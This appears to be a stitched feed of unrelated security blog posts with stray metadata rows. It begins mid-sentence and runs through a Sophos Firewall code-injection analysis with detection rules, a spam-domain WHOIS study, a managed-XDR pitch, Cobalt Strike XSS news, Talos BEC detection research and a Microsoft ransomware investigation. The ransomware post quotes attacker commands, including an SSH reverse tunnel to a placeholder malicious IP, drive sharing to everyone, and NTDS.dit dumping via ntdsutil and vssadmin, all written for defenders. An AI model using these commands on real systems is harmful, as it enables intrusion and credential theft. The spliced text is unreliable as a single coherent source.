a comma (“,”) character. • An item is comprised of a key and a value. A key is delimited from its value by a colon (“:”) character. • A key must be a string enclosed in quotes. • A value must be a valid type. JSON defines seven value types: string, number, object, array, true, false, and null. • An array is an object enclosed in square braces []. • An array is comprised of zero or more strings, numbers, JSON objects, arrays, boolean, or null type-objects delimited by a comma (“,”) character. An example JSON object is as follows: {“name”:”bob”, “age”:30} The web admin and user portal web interfaces exposed by Sophos Firewall both run on a Jetty server behind an Apache httpd server. Configuration and diagnostic requests issued through these interfaces are submitted via requests to the Controller servlet. This servlet retrieves the appropriate EventBean object based on the mode HTTP request parameter. For example, if the mode HTTP request parameter is set to 151 or 451, the WebAdminAuth or UserPortalAuth classes are called to process the request, respectively. In each of these classes, the generateAndSendAjaxEvent() method of the CSCClient class is called. This method parses the json HTTP request parameter and modifies specific fields from the parsed object. The send() method is then called, which in turn calls _send() , which adds the mode JSON parameter according to the mode of the associated EventBean object. It then sends the created JSON object as a string, including appropriate headers, to the local CSC server over TCP or UDP port 299. When the CSC server receives the JSON object submitted by the Jetty server, it validates the JSON object submitted via the validateJSON() method in the Perl script CyberAPIArch.pm . If the JSON object contains a key named _discriminator , the getValidationHash() method is called. This method iterates over each key of the _discriminator Perl hash, representing field names. Each field name is associated with a JSON object describing the mapping between field values and object names. Some Perl objects resolved when parsing the JSON object received ( natrule , securitypolicy , hotspot , etc.) contain a template with a _discriminator key containing such a mapping for specific field names between field values and their associated objects. The method iterates over the field values to check whether the submitted JSON object contains a field with the referenced name and value. If so, it retrieves the associated object name and attempts to resolve it to an object using the eval function . A code injection vulnerability has been reported for Sophos Firewall. This vulnerability is due to improper validation of JSON keys submitted in the “json” parameter sent to the Controller endpoint. Specifically, the _discriminator key can be set in the HTTP request. This JSON object is sent, after some modification, to the CSC server. However, the _discriminator key set is sent unmodified. Once the validateJSON() method of the Perl script CyberAPIArch.pm is called, it will detect this key and call getValidationHash() . The Perl method iterates over the $hashObj hash object, which contains a key named _discriminator whose value is a nested hash with a value key set with the value set for the _discriminator key in the original request sent. This value key is treated as a nested hash containing field values mapped to object names. Therefore, if the originally submitted JSON object contains a key named value with its value set to one of the values in this nested hash, the associated object name will be resolved using the eval function. Since the _discriminator key in the original request can be set to a JSON object with an arbitrary mapping between values and object names, a malicious object can be submitted to be concatenated into the eval function, resulting in code injection. Sophos attempts to perform input validation on request parameters, including the JSON object, using the RequestCheckFilter Java object. This filter detects request parameters and JSON keys with non-ASCII printable characters. However, arbitrary request parameters and JSON keys containing ASCII printable characters can still be submitted, including the _discriminator key. A remote, unauthenticated attacker could exploit this vulnerability by sending a crafted request to the target server. Successfully exploiting this vulnerability could result in arbitrary Perl commands being run on the server, resulting in remote code execution with the privileges of the root user. Source Code Walkthrough The following code snippet was taken from Sophos Firewall version 19.0.1 with additional comments added by Trend Micro. From the decompiled Java class cyberoam.sessionmanagement.RequestCheckFilter : From the Perl script CyberAPIArch.pm : Detecting Attacks To detect an attack attempting to exploit this vulnerability, the detection device must monitor and parse traffic on ports 443/TCP and 4444/TCP. Note that the traffic is encrypted with SSL/TLS. The detection device must decrypt the traffic before proceeding through the next steps. Based on the TCP ports monitored, the detection device must inspect HTTP GET and POST requests to a Request- URI containing the following string: Requests to the Webadmin Controller endpoint (TCP port 4444) can use the multipart/form-data encoding. Multipart/form-data is made up of multiple parts, each of which contains a Content-Disposition header. Each part is separated by a string of characters. The string of characters separating the parts is defined by the boundary keyword found on the Content-Type header line, which is set to “multipart/form-data”. The Content-Disposition header contains a name parameter describing the form element being returned. Additional header lines may be present in each part. Each line is separated by a new line sequence. The header is terminated by two consecutive new lines. The form element's data follows. The filename parameter provides a suggested filename to be used if the entity is detached and stored in a separate file . The following is a sample Content-Disposition header for a file item, where the boundary keyword is “TMSR”: If a request to one of the above endpoints is found, the detection device must parse its parameters according to the encoding described in the Content-Type header and search for the json parameter. If found, the detection device must inspect the json parameter value using any suitable methods below. Method 1 : If the detection device is capable of parsing JSON, it must parse the json parameter as a JSON object. The detection device must parse any items (potentially nested) whose key is the string “_discriminator”. If found, the traffic should be considered malicious as an attack exploiting this vulnerability is likely underway. Method 2 : If the detection device is not capable of parsing JSON, it must inspect the json parameter as a string and check if it contains the string “_discriminator”. If found, the traffic should be considered malicious as an attack exploiting this vulnerability is likely underway. Additional things to note: • Parameter names and values may be URL-encoded and must be decoded before applying the above detection guidance. • String matching for the URI and parameter names (“json”) and values (“_discriminator”) must be performed in a case-sensitive manner. • String matching for HTTP header names (i.e., “Content-Type”) and values (i.e., “multipart/form-data”) must be performed in a case-insensitive manner. Conclusion There are reports that this vulnerability is being used to target a small group of organizations and that Sophos has “informed each of these [affected] organizations directly.” This bug is also similar to a previous vulnerability, CVE-2022-1040, that that Volexity and The Record claim was used by a Chinese APT crew in March 2022. Regardless, this bug has a CVSS base score of 9.8 and should be remediated immediately. Sohpos users who don’t have hotfixes enabled or are on legacy versions should patch immediately as outlined in Sophos’s advisory . You should also consider blocking the affected ports from external network access if it is not required.

Regardless of form and affected device, clicking a malicious link embedded in a spam email or downloading a malware-laden attachment can lead to financial, data, or identity theft. To this end, knowing and consequently blocking access to where these harmful messages come from is of utmost importance to companies. As part of our ongoing effort to make the Internet safer, we sought to expand an initial list of 53 verified malicious spam domains aided by WHOIS, DNS, and IP intelligence. Our findings include: A sample of the additional artifacts obtained from our analysis is available for download from our website . We began our investigation by looking for identifiable characteristics among the IoCs. To do so, we ran them through a bulk WHOIS lookup that revealed: We subjected the IoCs to DNS lookups , which led to the discovery of 71 IP addresses to which they resolved. While none of them are currently detected as malicious, their connection to confirmed malicious spam domains warrant that they at least be monitored for signs of criminal activity. A bulk IP geolocation lookup for the IP addresses showed that most of them were geolocated in the U.S., China, Germany, and Japan. Apart from Japan, the U.S., China, and Germany were part of Spamhaus’s list of top spam-sending countries as of 29 September 2022. Next, we performed historical WHOIS searches for the IoCs, which uncovered 18 registrant email addresses. The majority of them (79%) were QQMail (i.e., qq.com) accounts although their owners would be hard to identify given the use of random characters (i.e., letters and numbers) instead of proper names. To further expand the list of potentially related threat artifacts, the IP addresses were used as reverse IP search terms. That led to the discovery of 354 domains. Fortunately, none of them are currently deemed malicious. Several, however, shared similarities with the IoCs, and so warrant closer attention from security teams. These domains include 87 NRDs whose registrant details have been redacted. Even if no organization can escape spam, protecting against outright malicious emails that can lead to financial and reputational damages can still be made more effective by identifying and blocking threats from the source with the aid of WHOIS, DNS, and IP intelligence.

Other companies hire the brightest minds in the security industry. But without strategic processes in place, they fail to fully leverage the team. In other cases, teams are laser-focused on superb policies and processes, but are missing the advanced technology to carry them out. In each of these scenarios, cyber defenses are like a two-legged stool, unable to bear the full weight of an organization’s security requirements. For this reason, many organizations look to managed services partners to provide a more stable and balanced cybersecurity platform to protect their operations. “People, process, and technology” have long been cited as the three pillars of IT, and the same principle applies to cybersecurity. People as a Cybersecurity Pillar The people part of the three pillars includes the following: Security awareness and training for all users Adequately skilled members of the security team Sufficient staffing for 24x7x365 cybersecurity coverage Process as a Cybersecurity Pillar The process part of the three pillars includes: Appropriate policies and management systems The use of proven frameworks like the NIST Cybersecurity Framework Planning, performing audits, and reporting on audit findings Technology as a Cybersecurity Pillar Maximizing the technology pillar within cybersecurity involves having the right people and processes and integrating those two pillars with items such as: Systems in place to mirror your security policies and risk appetite Mature AI-powered solutions that can stop attacks before they start Appropriate mix of in-house security — and outsourced managed services — based on staff size and skillsets Graphic: People, Process and Technology in Cybersecurity. While it’s easy to say that a program is well-balanced between these three pillars, it is not so easily achieved. Too often, organizations lack a strong foundation in all three, and the resulting imbalance makes them an easier target for threat actors. And these imbalances can appear within security teams of all scopes and sizes. Cybersecurity Challenges for Organizations With Big Security Budgets Some enterprise organizations have adequate budgets to maintain their own security operations center (SOC) or SecOps, and choose to deploy and maintain multiple point solutions, each designed to address a specific threat. The challenges for these security teams include mounting labor costs, multiplatform complexity, and “alert fatigue” from triaging endless security alerts from so many solutions. Recent research reveals that 83% of security professionals suffer from alert fatigue, and struggle with managing alerts alongside their other priorities. If left unaddressed, this increases employee burnout and turnover. The burden of training also grows in this scenario. Cybersecurity Challenges for Organizations with Small Security Budgets On the other hand, smaller organizations often cannot afford to hire or retain highly skilled talent, and many are also unable to maintain their own SOC, as the cybersecurity skills gap leaves them without the necessary internal expertise. As a result, we often discover that small and medium-sized businesses (SMBs) —and mid-market firms — underutilize the security tools they have because small teams lack the bandwidth to take advantage of all these solutions offer. This is part of why experts say SMBs represent “soft targets,” potentially attracting the attention of criminal and nation-state actors, and placing their organizations at risk of damaging and potentially business-ending data breaches. Cybersecurity Challenges for Teams of All Sizes There are additional challenges security teams face regardless of organizational size or budget. Many have incomplete or poorly defined cybersecurity strategies, and may lack cohesive processes for investigating, detecting, and mitigating threats. They might believe that their deployed technology will protect them, but if the people and process pillars are out of balance, it limits their ability to correlate and act on the telemetry from their existing tools and technology. Balancing the Three Pillars of Cybersecurity What can organizations do to overcome these challenges, in the face of a continually evolving threat landscape, and with limited resources corresponding to any of these pillars? How can security teams ensure that they have full visibility into their ecosystem, and the capacity to respond to any threats they encounter? Many organizations find that security services provide the bridge — the critical link from where they are today, to where they need to be. Let’s look at one example where this approach can successfully bring people, process, and technology together, to deliver on all three pillars of cybersecurity and produce the desired business outcomes. Security Services Case Study: Managed XDR A growing number of organizations are seeking to adopt an XDR (extended detection and response) security model to reduce risk and prevent attacks, and when necessary, respond to and remediate advanced cyberattacks. XDR is a unified cybersecurity approach that collects and analyzes data from multiple sources to improve visibility and security controls across the enterprise. Think of it as an expansion of existing endpoint detection and response (EDR) capabilities. A growing number of organizations are adopting XDR to improve their security posture. However, companies seeking to deploy XDR technologies and processes often discover that maximizing the benefits of this approach — balancing and solidifying all three pillars of cybersecurity — remains out of reach. This is because XDR currently takes significant resources — including people and money — to fully implement as a stand-alone business. Detailed analysis from the BlackBerry Managed XDR Buyer's Guide . In addition to significant cost savings, a recent Foundry MarketPulse survey conducted for BlackBerry found that managed services — such as managed XDR — deliver a wide scope of experienced benefits. See the chart below for how IT and cybersecurity decision-makers say they benefitted from implementing managed services. Foundry MarketPulse report example on Managed Security Services Expectations and Experience. People, Process, Technology in Cybersecurity Weakness in any of the three pillars — people, process, or technology — can jeopardize your cybersecurity capabilities and increase risk to the organization. An increasing number of organizations of all sizes are turning to managed XDR solutions to strengthen all three cybersecurity pillars, thus reducing the risk of a successful cyberattack affecting or interfering with the organization’s operations and business goals.

Cobalt Strike is a commercial red-team framework that's mainly used for adversary simulation, but cracked versions of the software have been actively abused by ransomware operators and espionage-focused advanced persistent threat (APT) groups alike. The post-exploitation tool consists of a team server, which functions as a command-and-control (C2) component, and a beacon, the default malware used to create a connection to the team server and drop next-stage payloads. The issue, tracked as CVE-2022-42948 , affects Cobalt Strike version 4.7.1, and stems from an incomplete patch released on September 20, 2022, to rectify a cross-site scripting ( XSS ) vulnerability ( CVE-2022-39197 ) that could lead to remote code execution. ""The XSS vulnerability could be triggered by manipulating some client-side UI input fields, by simulating a Cobalt Strike implant check-in or by hooking a Cobalt Strike implant running on a host,"" IBM X-Force researchers Rio Sherri and Ruben Boonen said in a write-up. However, it was found that remote code execution could be triggered in specific cases using the Java Swing framework , the graphical user interface toolkit that's used to design Cobalt Strike. ""Certain components within Java Swing will automatically interpret any text as HTML content if it starts with <html>,"" Greg Darwin, software development manager at HelpSystems, explained in a post. ""Disabling automatic parsing of HTML tags across the entire client was enough to mitigate this behavior."" This means that a malicious actor could exploit this behavior by means of an HTML <object> tag , utilizing it to load a custom payload hosted on a remote server and inject it within the note field as well as the graphical file explorer menu in the Cobalt strike UI. ""It should be noted here that this is a very powerful exploitation primitive,"" IBM researchers said, adding it could be used to ""construct a fully featured cross-platform payload that would be able to execute code on the user's machine regardless of the operating system flavor or architecture.""

BEC is a multi-stage attack. Adversaries first identify targets, then they establish rapport with the victim before exploiting them for whatever their end goal is. In the case of BEC, a threat actor can impersonate any employee in the organization to trick targets. A policy that checks for authorized email addresses of the sender can prevent BEC attacks. However, scaling the approach for every employee in a large organization is a challenge. Building an executive profile based on email analysis using a machine learning model and scanning emails against that profile will detect BEC. Data collection for building and training machine learning algorithms can take time, though, opening a window of opportunity for threat actors to exploit. Detection of exploitation techniques such as lookalike domains and any differences in the email addresses in the ""From"" and ""Reply-to"" fields can also detect BEC messages. However, the final verdict cannot account for the threat actor’s intent. The intent-based approach detects BEC and then classifies it into the type of scam. It catches BEC messages, irrespective of whether a threat actor is impersonating a C-level executive or any employee in an organization. Classification based on the type of scam can help identify which segment of an organization was targeted and which employees were being impersonated by the threat actor. The additional information will further assist in better designing preventive features to stop BEC. Business email compromise (BEC) is one of the most financially damaging online crimes. As per the internet crime 221 report, the total loss in 2021 due to BEC is around 2.4 billion dollars. Since 2013, BEC has resulted in a 43 billion dollars loss. The report defines BEC as a scam targeting businesses (not individuals) working with foreign suppliers and companies regularly performing wire transfer payments. Fraudsters carry out these sophisticated scams to conduct the unauthorized transfer of funds. This introduces the challenge of how to detect and block these campaigns as they continue to compromise organizations successfully. There are a variety of approaches to identifying BEC email messages, such as using policy to allow emails from authorized email addresses, detecting exploitation techniques used by threat actors, building profiles by analysis of emails, and validating against the profile to detect BEC. These approaches have a variety of limitations or shortcomings. Cisco Talos is taking a different approach and using an intent-based model to identify and block BEC messages. Before we get too deep into the intent-based model, take a deeper look at the commonly used approaches to block BEC from the simplistic through machine learning (ML) approaches. Policy-based detection The first place to start is with policy-based detection as it is one of the most common and simplistic approaches to blocking BEC campaigns. Let’s start by looking at an example of a BEC email. Here the actor is attempting to impersonate the CEO of an organization, but if we notice the email itself is associated with a Gmail address, obviously not the corporate domain. Threat actors commonly use free email addresses to send BEC emails. In a policy-based approach, the names of executives and the email address from which they send emails are kept in a database. For every incoming email, a policy rule is implemented that identifies messages that contain the names of executives in the From field and which originate from outside of the tenant. If the email is not from the email address specified in the database for the executive, an alert for BEC is raised. The limitation of this type of detection is that not all BEC campaigns purport to be originating from the CFO/CEO or other senior executives. The example below shows a payroll scam where threat actors were impersonating marketing managers. If the legitimate email addresses of other employees in an organization are not in the database, BEC email messages impersonating non-C-Level executives will get bypassed. Keeping the email address of every employee and vendor for a large corporation will be a challenge. The policy-based solution will stop the BEC exploitation; however, the verdict of the approach will lack the display of intent of the threat actor. Detecting exploitation techniques BEC emails can use exploitation techniques such as look-alike domains in the sender's email address, and the difference in the email address in the ""From,” ""Reply-to"" fields. Some of the ways by which a look-alike domain can be constructed are brand name embedding with ('-'), brand name homograph, miss-spelled brand name, and brand name registered with an uncommon generic top-level domain. The screenshot below shows the initial lure BEC email where the email address in the “From:” field is a spoofed corporate email address, and “Reply-To:” is sent to Gmail. Any reply to the BEC email will be sent to the threat actor’s Gmail address specified in the “Reply-To” field. These anomalies due to exploitation techniques in the sender’s email address can be aggregated with other behavior to detect BEC exploitation. Even though the approach to detect exploitation technique will detect BEC email messages, the approach has limitations. BEC is a multi-stage attack. The first stage is to identify the target, the second stage is to establish rapport with the victim, and the third is the exploitation stage which involves instructing the victim to send money, gift card, or sensitive information. The final verdict of the algorithm will lack the intent of the threat actor. For example, in the verdict, it will not be clear whether the scam that got stopped was a payroll scam or an initial lure scam. Understanding the intent will aid in better understanding which segment inside the organization was targeted and at what stage the exploitation got stopped. The information can then be used as a feedback loop to design preventive features better. Building a profile using ML-based model A machine learning algorithm can be used to build a profile of C-level Executives by analyzing emails. Some of the feature sets which can be used to create profiles are writing style, activity base features such as date, time, geo-location- location from where a person is accessing emails, relations graph which will capture with whom the person interacts, etc. Every incoming email is scanned against the profile. In case of any deviation from the profile, raise an alert for BEC. The method will detect BEC, but it has limitations. Training of the Machine Learning model will require data from real traffic. Data collection, model building, and training will take time, opening a window of opportunity for threat actors to exploit. The final verdict of the algorithm will still lack the intent of the threat actor. Threat actors can impersonate anyone in the organization for BEC scams such as payroll scams. Building the profile of everyone in a large organization will be challenging. Intent-based approach A policy-based approach to detect BEC checks for authorized email addresses; if the sender’s email address is not in the authorized list, it is dropped. The approach will require keeping the email addresses of every employee and vendor, which will be a challenge for a large size corporation. Building an executive profile based upon analysis of emails using a Machine Learning algorithm detecting exploitation techniques used by threat actors is the other approach used by threat actors. Both these approaches will lack the display of intent of the threat actor in the final verdict, and building the profile of every employee based upon analysis of emails in an organization will not be a scalable model. To overcome the limitations of the above approaches, we designed an intent-based approach to detect BEC. The approach breaks down detecting BEC into two distinct problems, a binary class problem, which classifies emails into a BEC message, and a multi-class problem, which classifies BEC into the type of scam. So, the Intent-based approach not only detects BEC but also labels it into the kind of BEC scam, which can be Payroll, Money Transfer, Initial Lure, Gift Card Scams, Invoice Scams, Acquisitions Scams, W2 Scams, aging reports, etc. The approach involves the extraction of text from an email, converting sentences to numeric vectors by encoding the meaning of words in the sentences, using NNLM or BERT encodings, and then performing detection and classification using deep neural networks. The output of the model is a probability score. The high confidence score is used to give the verdict; the low confidence score is combined with other analytic detections to deliver the judgment of the BEC. Intent-based approach to detect BEC provides an inherent advantage. The method will detect BEC exploitation irrespective if the threat actor is impersonating a C-Level executive or any other employee in an organization. Classification of BEC into the type of scam will aid in identifying which segment of the company is targeted. Detecting BEC at the initial lure is always much better than detecting fraudulent banking details sent by threat actors. It will also give an insight into the stage at which an exploitation attempt is being detected, which will aid in designing better preventive features.","['bec', 'On The Radar']",5399287c-ccec-595f-8d4c-3310546d21ef,"Cisco Talos is taking a different approach and using an intent-based model to identify and block Business Email Compromise (BEC) Scans BEC messages, irrespective of whether a threat actor is impersonating a C-level executive or any employee in an organization.

635124b928e9d467ce428315,microsoft,https://www.microsoft.com/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations/,Defenders beware: A case for post-ransomware investigations,Microsoft Detection and Response Team (DART),2022-10-18,"Ransomware is one of the most pervasive threats that Microsoft Detection and Response Team (DART) responds to today. The groups behind these attacks continue to add sophistication to their tactics, techniques, and procedures (TTPs) as most network security postures increase. In this blog, we detail a recent ransomware incident in which the attacker used a collection of commodity tools and techniques, such as using living-off-the-land binaries, to launch their malicious code. Cobalt Strike was used for persistence on the network with NT AUTHORITY/SYSTEM (local SYSTEM) privileges to maintain access to the network after password resets of compromised accounts. This incident highlights an attacker’s ability to have a longstanding dwell time on a network before deploying ransomware. We will also discuss the various techniques used as well as the recommended detections and defense techniques that customers can use to increase protection against these types of attacks. Microsoft recommends hunting proactively for pre-ransomware behaviors and hardening your network to prevent impact. Refer to https://aka.ms/ransomware-as-a-service for more information about defending against ransomware-related incidents. What we found Figure 1. Overall timeline of activities of the ransomware incident Initial access DART was unable to determine the initial entry vector of this attack due to the age of this compromise and limited retention of security solutions, along with encrypted devices being reimaged before analysis. The earliest observed activity showed the actor with domain administrator credentials. Persistence In DART’s post ransomware investigation of this engagement, the team found multiple instances of scheduled tasks and services being created by the attack for persistence after they had gained access to highly privileged credentials. Services and Scheduled Tasks have the option to run as NT AUTHORITY\System, allowing their malicious code to run with highly privileged access. Because the actor created those tasks and services on a domain controller, the Local SYSTEM access allowed them to easily access domain administrator accounts. The deployment of a backdoor to a domain controller can help an actor bypass common incident response recovery activity, such as resetting compromised accounts, in the hope of staying resident on the network. Service: Cobalt Strike Cobalt Strike was seen on a large scale across the network, on domain controllers, servers, and administrator workstations. The actor created Windows services to persist their payload executing rundll32 to load the Cobalt Strike DLL through invoking the “AllocConsole” exported function of a variation of the Termite family of malware. These services were observed to execute with a combination of SYSTEM and domain administrator credentials. Termite malware is often used by crimeware groups to load Cobalt Strike while bypassing antivirus detections. Further information on the Termite malware family can be found in this blog: (Ex)Change of Pace: UNC2596 Observed Leveraging Vulnerabilities to Deploy Cuba Ransomware . Figure 2. Example of the actor executing Cobalt Strike through rundll32.exe with system integrity The Cobalt Strike DLLs were in C:\Windows\Temp and used a naming scheme based on the first and local octet of the command and control (C2). Once the actor installed Cobalt Strike on a domain controller, the malware was spread using a PowerShell script, which copied the DLL to C:\Windows\Temp via SMB, and then executed it through remote service creation. Figure 3. Example of the threat actor copying Cobalt Strike through SMB The actor elevated their permissions to “NT AUTHORITY\System” through service creation. This service creation was likely done through Cobalt Strike, using a pseudorandom service name, such as “4aedb00”. Scheduled task: OpenSSH The actor installed OpenSSH on the client’s network to maintain persistence on critical servers, including domain controllers and domain administrator workstations. The actor installed OpenSSH within C:\Windows\OpenSSH , rather than the standard OpenSSH path in System32. The actor created a scheduled task for a persistent SSH connection to their C2 as “NT AUTHORITY\System” . The actor used TCP 443 for their SSH traffic rather than the standard TCP 22. In many organizations, TCP 22 outbound may be blocked, but as TCP 443 is needed for web traffic the port is often open. The actor also enabled port forwarding on TCP 7878 to allow the tunneling of malicious tools through the SSH connection. The actor was also observed renaming ssh.exe to “C:\Windows\OpenSSH\svchost.exe” in a likely attempt to evade detection. Figure 4. Example of the process masquerading to hide SSH usage Four days after the actor deployed the ransomware, the actor returned to the compromised network through their existing OpenSSH persistence to install further persistence SSH services on additional domain controllers and domain administrator workstations. The actor used OpenSSH’s sftp-server to transfer files between their C2 and the compromised host. The actor generated SSH keys on compromised hosts using ssh-keygen.exe , a tool apart of the OpenSSH tool suite. This allowed the actor to SSH using the keys rather than credentials, after credentials had been reset. Lateral movement Impacket (WMI) Impacket’s WMI modules were used throughout the early stages of the compromise for remote execution and discovery. Impacket is an open-source collection of scripts for working with network protocols. This toolkit has recently been used by a large variety of crimeware groups for lateral movement and network discovery. The actor used Impacket to execute PowerShell scripts out of “C:\Perflogs\” , which created .txt files within the same directory. All commands executed through Impacket output the results of the command to “\\127.0.0.1\ADMIN$\__1648051380.61” . The actor then deleted the PowerShell scripts and text files after execution. Figure 5. Sample Impacket query with results being output into a file within the ADMIN$ directory The actor also used Impacket to test if the destination server was able to ping the actor’s C2 before deploying Cobalt Strike to the device. Figure 6. Actor testing the connectivity to their C2 through Impacket PsExec The actor used PsExec.exe to spread the ransomware on the victims’ network. The actor first executed “open.bat” , which executed “net share [C-Z]=[C-Z]:\ /grant:everyone,FULL” . This shared every drive on the host, granting access to everyone. “A.exe” , “Anet.exe” , and “Aus.exe” are all variants of the Cuba ransomware. Figure 7. Command lines the actor executed through PsExec Remote desktop protocol While the attacker had access to lateral movement and remote code execution via Impacket and PsExec, the main method they used for lateral movement in this incident was Remote Desktop Protocol (RDP), which allowed them to use a GUI environment to change system settings and install malware. The actor used domain administrator accounts to RDP between devices. Credential access WDigest The actor abused WDigest to cache credentials early in the compromise. This enabled the actor to gain access to domain administrator credentials. WDigest is a Windows feature that when enabled, caches credentials in clear text. This is often abused by credential access tools, such as Mimikatz. To detect if WDigest has been enabled within your network, the registry key HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential will be set to 1. This can be disabled by setting the value to 0. Figure 8. Example of the actor enabling WDigest NTDSUtil Dumping The actor obtained the Active Directory database ( NTDS.dit ) twice. On the first instance, the actor obtained the NTDS.dit five months into the compromise. Four days after the deployment of ransomware, the actor obtained the NTDS.dit a second time. The actor was able to create a copy of the NTDS.dit through the usage of the native tool ntdsutil.exe , copying the .dit to “C:\Windows\Temp\data\audit\Active Directory\ntds.dit” . Figure 9. Actor command to obtain ntds.dit Volume shadow copy access The actor used a second method to obtain the Active Directory database, they used “vssadmin” to create a volume shadow copy of a domain controller. This technique creates a static copy of system files that a user would not typically be able to access. Once the volume shadow copy was created, the actor copied the NTDS.dit , SYSTEM hive and SECURITY hive to C:\Windows\ , where they could then remotely copy through the ADMIN$ share. Figure 10. Actor commands to create Volume Shadow Copy and copy the ntds.dit Exfiltration Compression The actor was observed using 7-Zip to compress files before exfiltration. 7z.exe was executed out of C:\Windows\Temp . The actor did not include a password for the archive and used the device hostname as the name of the archive (for example: DC01.7z ). PSCP The actor used PuTTY Secure Copy (PSCP) to remotely exfiltrate network shares to an actor controlled C2. This version of PSCP had been renamed to “lsas.exe” in an attempt to masquerade itself as the legitimate “lsass.exe” service. PSCP was executed out of C:\Windows\Temp . The actor targeted Staff and Financial related resources. Figure 11. Masqueraded PSCP to exfiltrate files Defense evasion Disabling antivirus The actor disabled Microsoft Defender Antivirus on multiple devices after files had been quarantined by the antivirus. The actor turned off Microsoft Defender Antivirus through the Windows Security GUI application while connected via RDP to the device. Figure 12. Microsoft Defender for Endpoint alert from the actor disabling real-time monitoring Kernel driver The actor used an Avast anti-rootkit driver. Unit 42 recently released a blog on how Cuba ransomware groups have used this driver to disable antivirus software before deploying the Cuba ransomware. The actor installed the driver using the “sc” command, enabling kernel-level permissions. The actor then started the service with “sc start aswSP-ArPot2” . This service was used by the actor to disable the victims’ antivirus products through Kernel privileges. Antivirus products being disabled within the victim network ensured that their ransomware would spread without the malware being quarantined or prevented. Figure 13. Vulnerable driver being installed The actor also created benign binaries to trigger the driver vulnerability. These binaries would iterate through a list of common antivirus executable names, providing each one to the control code 0x9988C094 and subsequently tasking the driver to kill those processes. Discovery The actor was observed executing generic system enumeration commands. While these commands are not malicious, when seen together, it can often indicate an unauthorized user is enumerating the system. The actor was seen executing the following commands: whoami ping 8.8.8.8 TASKLIST /v sc queryex type=service state=all wevtutil el SYSTEMINFO dsquery user -limit 100000 powershell -command “Get-ADUser -Filter * -Properties * | Out-File C:\Windows\Temp\data\domain_user.txt -Append” powershell -command “Get-ADComputer -Filter * -Properties * | Out-File C:\Windows\Temp\data\domain_pc.txt -Append” wmic useraccount list full Recommended detection and defense strategies As we observe more attacks using similar methods as described in this blog, organizations must ensure they follow security practices to defend their servers. The following is a list of recommendations for monitoring that organizations should implement as part of their detection strategy. Service creation Service creation events should be monitored for anomalous events. A high priority alert should be placed on administrator accounts creating services that execute as System. This is a common privilege escalation technique that can be utilized in a variety of methods, including having the service. Execute a malicious binary directly, Write to an actor controlled Named Pipe, allowing the actor to steal an impersonation token, Executing a DLL through rundll32.exe Figure 14. Instance of rundll32.exe execute Cobalt Strike with System integrity level New service creations should be monitored for anomalous paths or executables. High priority alerts should be made for drivers located within those anomalous paths. While the driver was legitimately signed, the location can be a sign of malicious use. Examples of anomalous paths include but are not limited to: C:\Temp\ C:\ProgramData\ C:\Windows\ C:\Windows\Temp\ Use of SSH Microsoft recommends monitoring for unauthorized installations and usage of SSH in your network. SSH should not run as “NT AUTHORITY\System” . In this incident, the actor used the following SSH command lines. Similar activity should be monitored within your environment: ssh <organization>@<malicious IP address> -p 443 -i C:\ProgramData\ssh\id_ed25519 -R <malicious IP address>:10129:127.0.0.1:7878 -N -C -o IdentitiesOnly=yes -o StrictHostKeyChecking=no The actor attempted to masquerade the SSH process as “ svchost.exe ” , so monitoring for the command on other process names may indicate process masquerading. Copying to remote share Microsoft recommends monitoring for the command prompt accessing remote shares. This was a common technique used by the actor for transferring files throughout the network. Figure 15. The actor copying Cobalt Strike via SMB Microsoft Defender for Endpoint will create an alert when the command prompt accesses remote shares. This includes the Impacket usage where the command targets the localhost ADMIN$ share. Monitoring these alerts within your network can help detect unauthorized access. Figure 16. Sample alert in Defender for Endpoint when a command prompt accesses a remote share PsExec Networks should monitor for unauthorized usage of PsExec. Suggested detection techniques include: Existence or execution of the binary: PsExec.exe Existence or execution of the service binary: PsExeSvc.exe Service creation named PsExeSvc Named Pipes created with the name PsExeSvc The techniques that PsExec uses can easily be replicated, either through living-off-the-land tools or through a custom toolset using the Windows API. Monitoring for each stage of PsExec can help detect unauthorized variants within your network. PsExec works in three stages: SMB connection to ADMIN$ on the destination device, copying the binary “PSEXESVC” to the Windows directory. Remote connection to RPC (port 135) on the destination device, creating a service to execute the binary. Create the named pipe \\.\pipe\PSEXESVC to remotely communicate between host and destination. Figure 17. Diagram describing how PsExec works Monitoring executable files being written to administrative shares may help detect attempts of lateral movement. This can include monitoring for native command lines, such as copy, targeting remote shares like what we mentioned above. Defender for Endpoint can be used to monitor file creation events via Server Message Block (SMB) through DeviceFileEvents. The executable file will be created by the ntoskrnl.exe process, which is the kernel process that manages SMB, and the ShareName column will be ADMIN$. Figure 18. Example of PsExeSvc.exe being created via Server Message Block (SMB) in Defender for Endpoint Anomalous remote connections to RPC (Port 135) should be monitored within the network, as this can be used by a process to remotely create and start a service. The summarize and sort operators within Defender for Endpoint’s Advanced Hunting can help detect uncommon connections on Port 135. The following KQL can help build a basis for identifying anomalous connections: DeviceNetworkEvents | where RemotePort == 135 | summarize count() by InitiatingProcessFileName | sort by count_ asc Figure 19. Image showing PsExec.exe connecting to a remote host on port 135 This technique can also be replicated through remote service creation using named pipes. An actor can remotely connect to the IPC$ share and open the named pipe svcctl to remotely create a service. This would contain similar detections, except the traffic will be over port 445 to the IPC$ share. On the destination end, the RPC connection will result in the creation of a service. Monitoring for unauthorized service creation can be done through capturing the 4679 event in the System event log. Figure 20. Service creation event in Defender for Endpoint Remote named pipe communication can be monitored through the creation of the named pipe on the destination server. PsExeSvc.exe will create a named pipe called PSEXESVC, which the host device can connect to through the IPC$ share. As the host device connection is through SMB, the ntoskrnl.exe process will connect to the named pipe as a client. Figure 21. Remote SMB named pipe communications for PsExec NTDS.dit dumping Monitor the usage of ntdsutil for malicious instances, where actors may attempt to obtain the NTDS.dit . The command in the NTDS.dit dumping section shows how the actor used this tool to create a copy of the NTDS.dit . This command can be monitored, with the path being the only variable that will change. There are limited legitimate reasons to create a full NTDS.dit copy. Figure 22. Defender for Endpoint alert from ntds.dit dump Defender for Endpoint alerts on the dumping of the NTDS.dit , and these alerts should be responded to with high priority. Monitoring for the unauthorized usage of the “ntdsutil” tool is strongly encouraged as well. If your network has file monitoring enabled, alerting on the creation of new .dit files can also help detect potential NTDS.dit dumping. The actor was observed copying the NTDS.dit out of a volume shadow copy. Figure 23. Example command copying NTDS.dit from a volume shadow copy Antivirus tampering Organizations should monitor and respond to antivirus and endpoint detection and response (EDR) alerts where antivirus has been disabled or tampered with. Wherever possible, anti-tampering settings should be enabled to prevent actors from being able 